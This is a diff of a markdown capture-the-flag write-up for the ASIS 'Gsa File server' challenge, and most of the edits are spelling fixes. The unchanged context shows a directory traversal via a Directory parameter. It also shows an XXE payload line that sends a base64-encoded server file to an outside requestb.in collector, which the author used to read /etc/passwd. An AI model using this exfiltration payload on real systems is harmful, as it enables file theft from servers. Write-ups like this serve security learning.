@@ -13,13 +13,13 @@ So after checking the website, look like a simple web app with JS (js/functions.
 
 ![img](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/1.PNG)
 
-so i tried  a GET request to see the server answer and all i get is this  (look like listing the elements in specefic current directory
+so i tried  a GET request to see the server answer and all i get is this  (look like listing the elements in specific directory
 ![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/2.PNG)
 
 let check with burpsuit :
 ![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/3.PNG)
 
-Bingooo, as you can see in the server answer ther is the Directory parameter , so let's try some traversal things ,
+Bingooo, as you can see in the server answer there is the Directory parameter , so let's try some traversal tricks ,
 ![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/4.PNG)
 
 use ../  and you can see that it's work perfectly , let's check others files 
@@ -31,8 +31,7 @@ so the admin panel is the (panelmanager-0.1) , now we have to read the files on 
 let's try 128.199.40.185/panelmanager-0.1 .. FAIL!!!
 but as you can see in the description that said (that Scope is 128.199.40.185:*) 
 
-you can check with nmap (becarfull with the scan tools) try the common port 8080 (FAIL) ..8081 (work)
-is a simple upload that's allow you to upload files (docx ..)
+try the common port 8080 (FAIL) ..8081 (work) as you can see is a simple upload that's allow you to upload files (docx ..)
 
 ![img](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/099.PNG)
 
@@ -48,7 +47,7 @@ where the txt file contains:
 <!ENTITY % injme '<!ENTITY startme SYSTEM "https://requestb.in/****?xxe=%filebase64;">'>
 ```
 
-so i have only to modify the payloads in my webserver and reupload the file docx (with it rebuild-it every single try)
+so i have only to modify the payloads in my webserver and reupload the file docx (without rebuild-it every single try)
 and to check the aswer you have to visite (https://requestb.in/****?inspect) 
 
 i get answer for the /etc/passwd  
